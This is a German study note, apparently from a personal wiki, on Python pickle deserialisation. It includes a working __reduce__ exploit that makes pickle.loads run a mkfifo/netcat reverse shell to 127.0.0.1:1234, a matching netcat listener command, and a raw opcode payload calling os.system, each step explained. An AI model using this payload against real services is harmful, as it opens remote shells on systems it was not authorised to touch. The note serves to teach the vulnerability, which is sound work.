# pickle (python)
Angelegt Montag 31 Oktober 2022


* s. auch [:Python:Diverses#objekte-speichern]()
* Mit [pickle − python-Doku](https://docs.python.org/3/library/pickle.html) kann man Objekte serialisieren und deserialisieren, um sie bspw. als Binärdatei zu speichern. Diese Methode ist **nicht** sicher und kann ausgenutzt werden
* [pickle.dumps(…) − python-Doku](https://docs.python.org/3/library/pickle.html#pickle.dumps) liefert Binärdaten, bspw. ``b-String``. [pickle.loads(…) − python-Doku](https://docs.python.org/3/library/pickle.html#pickle.loads) erwartet Binärdaten, bspw. ``b-String``
	* Die Binärdaten enthalten ``op-Codes``, die von ``pickle.loads(…)`` 1:1 ausgeführt werden. Können mit ``pickletools.dis(<pickle-BINÄRDATEN>)`` augeschlüsselt werden
	* [pickle.dump(…) − python-Doku](https://docs.python.org/3/library/pickle.html#pickle.dump) und [pickle.load(…) − python-Doku](https://docs.python.org/3/library/pickle.html#pickle.load) (beides ohne „s“) machen dasselbe nur mit Dateien


Exploit via ``__reduce__()``
----------------------------

* Exploit wird demonstriert auf: <https://checkoway.net/musings/pickle/>
* Implementiert man [``object.__reduce__()`` − python-Doku](https://docs.python.org/3/library/pickle.html#object.__reduce__) in einer Klasse, kann man beeinflussen, wie Instanzen dieser serialisert (und damit von [pickle − python-Doku](https://docs.python.org/3/library/pickle.html) verarbeitet werden) 
* Soll ``Tupel`` oder ``String`` zurückgeben
	* Wenn ``Tupel``: An erster Stelle ein *callable*-Objekt, an zweiter ein ``Tupel`` mit den Argumenten (wenn *Callable*) keine Argumente nimmt, ein Leeres
		* Es gibt weitere Möglichkeiten und Bedinugungen aber diese reichen für's Erste
	* Wenn ``String``: s. [``object.__reduce__()`` − python-Doku](https://docs.python.org/3/library/pickle.html#object.__reduce__)

❗️Hier kommt auch eine Schwachstelle ins Spiel: Man kann die ``__reduce__``-Funktion auch völlig anders gestalten. Das *Callable* muss Nichts mit der Klasse zu tun haben und kann bspw. ``os.system`` sein.

### Der Exploit

* Um den Exploit wirklich nutzen zu können, muss man zuvorderst einen [:Linux:**netcat & socat**](../netcat_&_socat.md)-Listener starten:

	nc -nvl 1234


* Unten stehender Beispielcode ignoriert die Zielseite. Dort findet sich lediglich eine [:Python:Module:**Flask**]()-Anwendung, die die Daten ``base64``-dekodiert und ``pickle.loads(…)`` aufruft.

	import pickle
	import base64 # Wird für das Versenden von (Binär-)Daten über ein Netzwerk verwendet
	import os
	
	
	class RCE:
	    def __reduce__(self):
	        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f') # Standardcode für eine Reverse-Shell
	        return os.system, (cmd,) # Callable und dessen Argumente als Tupel
	
	
	if __name__ == '__main__':
	    pickled = pickle.dumps(RCE()) # Umwandlung in Binärdaten
	    print(base64.urlsafe_b64encode(pickled))

Exploit via pickle selbst
-------------------------

* Exploit wird demonstriert auf: <https://www.bengrewell.com/2018/05/19/rotten-pickles-part-1/>
	* Eine ausführlichere Variante mit anderen Modulen: <https://checkoway.net/musings/pickle/>
* Weitere Befehle (S. 14) und ausführliche Beschreibung: [./Sour Pickles − Marco Slaviero.pdf](./pickle_(python)/Sour Pickles − Marco Slaviero.pdf)
* ``pickle`` kann als *Stack Language* interpretiert werden (leider habe ich hierzu noch keine offizielle Dokumentation gefunden)
* **Angriffsvektor**: ``b'cos\nsystem\n(S'/bin/echo blah'\ntR.``' bzw.
	1. ``cos``
	2. ``system``
	3. ``(S'/bin/echo Hello``'
	4. ``tR.``
	* Der ``b-String`` beschreibt das Auf- und Abbauen eines Stacks.


### Erklärung

1. ``cos``: Kann auf ``c`` und ``os`` aufgeteilt werden

``c`` Lies alles bis zum nächsten ``newline`` (``\n``) und interpretiere es als Modulname (uns lege es als erstes Element auf Stack)
``os`` Modulname
``import os``

2. ``system``: Funktion des Moduls, die aufgerufen werden soll (Argumente nicht spezifiziert

``os.system(…)``
``import os``

3. ``(S'/bin/echo Hello``': Beinhaltet mehrere Teile

``(`` Markierung, die in der nächsten Zeile für das ``t`` wichtig wird und dafür auch auf den Stack gelegt wird
``S`` Lies String innerhalb der '``…``' bis zum nächsten ``newline`` (``\n``)  und lege ihn wieder auf den 
'``/bin/echo Hello``'
``(``
``os.system(…)``
``import os``

4. ``tR.``

``t`` Entferne alles vom Stack bis Markierung, dh. ``(``, erreicht wurde, setzte alles zu einem Tupel zusammen und lege es wieder auf den Stack
``('/bin/echo Hello',)``
``os.system(…)``
``import os``
``R`` Entferne die oberseten zwei Stack-Elemente, führe den entsprechenden Aufruf aus und lege das Resultat wieder auf den Stack

* Unteres muss *Callable* sein
* Oberes muss *Tupel* sein

``os.system('/bin/echo Hello',)``
``import os``
``.`` Beendet die Stack-Bearbeitung und gibt das (hoffentlich) einzige Elemente auf dem Stack als Resultat des ``pickle``-Prozesses zurück.


